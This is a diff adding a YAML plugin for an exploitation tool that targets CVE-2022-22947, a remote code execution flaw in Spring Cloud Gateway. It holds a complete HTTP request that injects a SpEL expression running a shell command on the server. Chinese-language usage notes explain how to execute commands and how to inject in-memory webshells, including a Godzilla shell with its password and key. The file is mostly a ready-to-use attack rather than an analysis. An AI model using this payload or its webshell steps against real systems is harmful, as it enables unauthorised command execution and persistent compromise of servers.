@@ -1,0 +1,83 @@
+info:
+    app: spring
+    name: CVE-2022-22947
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2022-03-02"
+    create_date: "2024-10-06 08:53:14"
+    update_date: "2024-10-06 08:53:14"
+    scope: |-
+        Spring Cloud Gateway
+        3.1.0
+        3.0.0至3.0.6
+        其他老版本
+    description: CVE-2022-22947 SpringCloud GateWay SPEL RCE
+    vul_id: CVE-2022-22947
+    detail: |-
+        获取信息：
+        验证漏洞是否存在
+
+        命令执行：
+        URL不要跟路径，输入cmd执行即可
+        PS: 如果执行失败，会导致后续利用失败. 但删除这条路由即可
+
+        文件上传：
+        内存马注入，选择类型，直接点上传即可。
+        cmd马：header头添加Cookies: cmd即可
+        哥斯拉马：JAVA_AES_BASE64 密码2333 密钥2333
+    payload: |-
+        POST /prod-api/actuator/gateway/routes/AAAAAAAAAAAAAAAAA HTTP/1.1
+        Host: 192.168.111.1:8083
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Length: 337
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        {
+          "id": "AAAAAAAAAAAAAAAAA",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()))}"
+            }
+          }],
+          "uri": "http://192.168.111.1:8083/prod-api/"
+        }
+payloads:
+    - name: getmsg1
+      alias: 检测漏洞
+      params:
+          - key: route
+            title: 路由
+            param_type: edit
+            default_value: AAAAAAAAAAAAAAAAA
+            required: true
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: route
+            title: 路由
+            param_type: edit
+            default_value: AAAAAAAAAAAAAAAAB
+            required: true
+    - name: upload1
+      alias: 内存马注入
+      params:
+          - key: route
+            title: 路由
+            param_type: edit
+            default_value: AAAAAAAAAAAAAAAAC
+            required: true
+          - key: path
+            title: 内存马路径
+            param_type: edit
+            default_value: test
+            required: true
